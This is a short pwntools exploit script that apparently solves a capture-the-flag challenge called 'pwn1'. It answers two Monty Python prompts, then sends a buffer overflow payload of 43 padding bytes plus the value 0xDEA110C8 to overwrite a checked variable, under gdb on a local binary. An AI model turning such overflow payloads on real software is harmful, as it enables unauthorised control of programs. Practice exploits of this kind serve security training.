from time import sleep

from pwn import *

TARGET = "./pwn1"


def s(cmd):
    for c in cmd.split(b"\n"):
        if c.strip():
            # print(c)
            subprocess.run(["tmuxpwnrestart", "SEND", base64.b64encode(c)])


context.terminal = ["tmuxpwnrestart"]
context.log_level = logging.DEBUG

# socat = process(['socat', 'TCP-LISTEN:4141,reuseaddr,fork', f'EXEC:{TARGET},PTY,raw,echo=0'])
# # sleep(2)
# io = remote('localhost', 4141)
# p = process(TARGET)
# p = gdb.debug(TARGET, api=True)
# p = gdb.attach(proc.pidof(io))
# p = gdb.attach(io)

io = gdb.debug(
    TARGET,
    api=True,
    gdbscript="""
# b *(main+120)
# b *(main+313)
""",
)
s(
    # b'target exec ' + TARGET.encode() +
    # source gdbscript.py
    # b main
    # run
    # entry-break
    b"""
   continue
"""
)
io.sendline(b"Sir Lancelot of Camelot")
io.recv()
io.sendline(b"To seek the Holy Grail.")
io.recv()

g = cyclic_gen()
pattern = g.get(200)
print(g.find(b"alaa"))
io.sendline(b"A" * 43 + p32(0xDEA110C8))
io.interactive()
